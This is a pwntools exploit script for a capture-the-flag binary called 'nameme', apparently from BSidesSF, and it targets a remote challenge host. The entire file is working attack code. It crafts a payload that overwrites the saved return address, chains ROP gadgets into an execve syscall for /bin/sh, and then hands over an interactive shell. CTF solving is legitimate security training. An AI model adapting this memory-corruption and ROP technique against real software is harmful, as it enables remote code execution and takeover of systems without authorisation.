#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('nameme', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x004020D2  
        # b*0x401a31
        # b*0x401fea
        # b*0x401A00
        b*0x401a72
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('nameme-5c8bc3ce.challenges.bsidessf.net', 53535)
else:
    p = process([exe.path])
GDB()

syscall  = 0x00000000004011a2
pop_rax_rdx_rbx = 0x000000000046abb6
pop_rsi =0x000000000040fd82
pop_rdi = 0x00000000004028f0

load = flat(
    b'\0'*4,
    p16(0xbeef),
    p32(0xca7fbabe),
    # p32(0x6a6b6c6d) # start copy_num at 0x6b
    p16(0xdead),
)
num = 0x7f-9
for i in range(8):
    load += p8(num+i)

load += p8(0x20)

load += flat(
    # p8(0),
    p8(0x36),
    p8(0x7f),
    b'/bin/sh\0',
    p8(0x24)*(23-8),
    b'a'*7,
    # ptr_chunk_idx_1 at 0x20
    p8(0xc0),
    p8(0x16),
    b'a'*(5+14),
    pop_rsi,
    0,
    pop_rax_rdx_rbx,
    0x3b,
    0,
    0,
    syscall
)
# loops 9 times to overwrite saved rip
load = load.ljust(0x8c-9, p8(0x36))
# 0x0C is the start of the first num
base = 0x0d
for i in range(9):
    load += p8(0xc0)
    load += p8(base+i)

# saved_RIP = 0x7fffffffdb08
# load = load.ljust()
# offset from 0x7f to base: 0xc
# 9th loop rdi: 0x7fffffffdab4
load = load.ljust(0x98, p8(0x7f))

s(load)

p.interactive()
